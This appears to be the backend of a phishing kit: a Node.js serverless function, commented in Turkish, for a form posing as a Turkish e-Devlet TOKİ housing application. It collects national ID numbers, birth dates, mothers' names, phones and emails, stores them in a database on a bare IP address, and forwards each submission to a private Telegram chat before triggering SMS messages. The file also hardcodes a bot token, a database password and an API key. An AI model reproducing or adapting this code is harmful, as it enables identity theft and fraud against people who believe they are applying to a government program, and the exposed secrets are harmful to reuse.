// api/save-application.js

const axios = require('axios');
const { MongoClient } = require('mongodb');

// Vercel ortam değişkenleri
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8074262861:AAEIhWsYk1YNUpxa1IsUpSKuqQlezmFBrIQ';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003220073247';
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://app:GucluSifre123%21@83.136.211.173:27017/toki?authSource=toki';
const MONGODB_DB = process.env.MONGODB_DB || 'toki';

// Python API Bilgileri (Güvenlik nedeniyle kod içine gömüldü - ENV tercih edilir)
const MY_PYTHON_API_URL = 'http://83.136.211.173:5031/send_sms';
const MY_PYTHON_API_KEY = 'YGX9-MM32-WDQV-8SDE-AYRF-QUJZ-AKR3-9SB7';

let cachedClient = null;

// getClient (Değişiklik yok)
async function getClient(uri) {
    if (cachedClient) {
        try { await cachedClient.db('admin').command({ ping: 1 }); return cachedClient; }
        catch (err) { cachedClient = null; }
    }
    const client = new MongoClient(uri, { retryWrites: true, w: 'majority', serverSelectionTimeoutMS: 5000 });
    try {
        await client.connect();
    } catch (err) {
        console.error('[DB] MongoDB connection failed:', err.message);
        throw err;
    }
    cachedClient = client;
    return client;
}

// formatDate (Değişiklik yok)
function formatDate(date) {
    const d = new Date(date);
    const day = String(d.getDate()).padStart(2, '0');
    const month = String(d.getMonth() + 1).padStart(2, '0');
    const year = d.getFullYear();
    const hours = String(d.getHours()).padStart(2, '0');
    const minutes = String(d.getMinutes()).padStart(2, '0');
    const seconds = String(d.getSeconds()).padStart(2, '0');
    return `${day}.${month}.${year} ${hours}:${minutes}:${seconds}`;
}


// --- YENİ EKLENEN YARDIMCI FONKSİYON ---
/**
 * Telegram'a formatlı bir mesaj gönderir.
 * @param {string} text - Gönderilecek mesaj metni.
 * @param {string} parseMode - 'Markdown' veya 'HTML'.
 */
async function sendTelegramMessage(text, parseMode = 'Markdown') {
    if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'BOT_TOKEN') {
        console.warn('[TELEGRAM] BOT_TOKEN veya CHAT_ID yapılandırılmamış. Mesaj atlanıyor.');
        return;
    }
    
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        await axios.post(telegramApiUrl, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: parseMode,
            disable_web_page_preview: true
        });
        console.log('[TELEGRAM] Mesaj başarıyla gönderildi.');
    } catch (error) {
        console.error('[TELEGRAM] Yardımcı fonksiyon mesaj gönderemedi:', error.message);
    }
}
// --- YARDIMCI FONKSİYON SONU ---


module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method Not Allowed' });
    }

    let applicationId = null;
    let name, tc, birth_date, city, district, mother_name, phone, email, project;

    try {
        // 1. Veriyi Al ve Doğrula
        ({
            name, tc, birth_date, city, district,
            mother_name, phone, email, project
        } = req.body);

        if (!name || !tc || !phone || !email || !project) {
            return res.status(400).json({ success: false, message: 'Eksik bilgi...' });
        }

        // 2. MongoDB'ye Kaydet
        try {
            const client = await getClient(MONGODB_URI);
            const db = client.db(MONGODB_DB);
            const collection = db.collection('applications');
            const applicationData = { 
                name, tc, phone, email, project, 
                birth_date: birth_date || '', city: city || '', district: district || '', 
                mother_name: mother_name || '', created_at: new Date() 
            };
            const result = await collection.insertOne(applicationData);
            applicationId = result.insertedId.toString();
        } catch (dbError) {
            console.error('[DB] MongoDB save error:', dbError.message);
            // DB hatası olsa bile bildirimlere devam et
        }

        // 3. Ana Telegram Bildirimini Gönder
        let formattedBirthDate = ''; // (Doğum tarihi formatlama kodunuz)
        if (birth_date) {
            const parts = birth_date.split(/[\/\-]/);
            formattedBirthDate = (parts.length === 3) ? `${parts[0]}.${parts[1]}.${parts[2]}` : birth_date;
        }
        
        const messageText = `*✨ 🇹🇷 Yeni Başvuru Girişi (e-devlet Toki)*\n\n
*👤 Ad Soyad:* ${name}
*🆔 TC:* ${tc}
*📅 Doğum Tarihi:* ${formattedBirthDate || 'Belirtilmemiş'}
*🏙 Şehir:* ${city || 'Belirtilmemiş'}
*📍 İlçe/Adres:* ${district || 'Belirtilmemiş'}
*👩 Anne Adı:* ${mother_name || 'Belirtilmemiş'}
*🏠 Proje:* ${project}
*📱 Telefon:* ${phone}
*📧 E-posta:* ${email}
*🆔 Başvuru ID:* ${applicationId || 'Kaydedilemedi'}\n
*📅 Tarih:* ${formatDate(new Date())}`;

        // İlk bildirimi (await ile) gönder
        await sendTelegramMessage(messageText);

        
        // --- 🚀 GÜNCELLENEN BÖLÜM: "Fire-and-Forget" SMS Tetiklemesi ve Durum Raporu ---
        // Bu fonksiyonu 'await' ETMİYORUZ. 
        // Amacımız, res.status(200)'ü hemen döndürmek, bu işi arka planda yapmak.
        (async () => {
            let smsStatusMessage = '';
            // Başvuruyu eşleştirmek için bir tanımlayıcı (ID veya TC)
            const identifier = applicationId ? `(ID: ${applicationId})` : `(TC: ${tc.slice(0, 4)}...)`;

            try {
                const smsApiPayload = {
                    phone, name, project, applicationId
                };
                const apiHeaders = {
                    'Content-Type': 'application/json',
                    'X-INTERNAL-API-KEY': MY_PYTHON_API_KEY
                };

                // Kendi Python API'nize isteği gönder
                const smsApiResponse = await axios.post(MY_PYTHON_API_URL, smsApiPayload, { headers: apiHeaders });
                
                console.log('[My API] SMS isteği yanıtı:', smsApiResponse.data);
                
                // Python API'nizden gelen yanıta göre başarılı mesajı oluştur
                smsStatusMessage = `✅ *SMS Durumu: Başarılı* ${identifier}\n\n*Gönderen:* Python API\n*Yanıt:* \`${JSON.stringify(smsApiResponse.data.message || smsApiResponse.data)}\``;

            } catch (smsApiError) {
                // Python API'niz çökerse veya hata dönerse
                console.error('[My API] Kendi SMS API\'nize istek başarısız:', smsApiError.message);
                
                let errorDetail = smsApiError.message;
                if (smsApiError.response) {
                    console.error('[My API] Hata detayı:', smsApiError.response.data);
                    errorDetail = JSON.stringify(smsApiError.response.data);
                }
                
                // Hata mesajını oluştur
                smsStatusMessage = `❌ *SMS Durumu: BAŞARISIZ* ${identifier}\n\n*Hata:* \`${errorDetail}\``;
            }

            // Oluşan durum mesajını (başarı veya hata) Telegram'a gönder
            if (smsStatusMessage) {
                await sendTelegramMessage(smsStatusMessage);
            }
        })(); // <-- Fonksiyonu burada çağırıyoruz (await olmadan)

        // --- GÜNCELLENEN BÖLÜM SONU ---

        // 4. Kullanıcıya (Frontend'e) Hemen Başarılı Yanıtı Dön
        // SMS'in bitmesini BEKLEMEDEN bu yanıt döner.
        return res.status(200).json({ 
            success: true, 
            // Mesajı güncelledik:
            message: 'Başvuru alındı. Bildirimleriniz işleniyor.',
            application_id: applicationId
        });

    } catch (error) {
        // Bu blok, Vercel fonksiyonunun kendi içindeki (örn: JSON parse) hataları yakalar
        console.error('Genel Hata:', error.message);
        
        // Genel hata durumunda bile Telegram'a bildirim göndermeyi dene
        await sendTelegramMessage(`🔥 *KRİTİK HATA - VERİ KAYBI OLABİLİR* 🔥\n\n*Mesaj:* ${error.message}\n*Gelen İstek:* \`${JSON.stringify(req.body)}\``);
        
        return res.status(500).json({ 
            success: false, 
            message: 'Başvuru işlenirken beklenmedik bir sunucu hatası oluştu.',
            error: error.message
        });
    }
};